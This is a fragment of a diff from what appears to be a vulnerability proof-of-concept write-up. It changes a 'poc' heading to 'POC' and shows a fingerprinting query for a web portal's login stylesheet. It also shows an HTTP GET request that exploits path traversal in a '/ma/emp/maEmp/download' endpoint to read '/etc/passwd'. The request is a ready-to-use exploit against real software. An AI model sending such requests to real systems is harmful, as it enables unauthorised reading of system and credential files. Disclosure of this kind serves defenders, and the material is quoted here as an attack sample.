@@ -6,7 +6,7 @@ body="/pf/portal/login/css/fonts/style.css"
 ```
 
 
-## poc
+## POC
 ```
 GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1
 Host: 
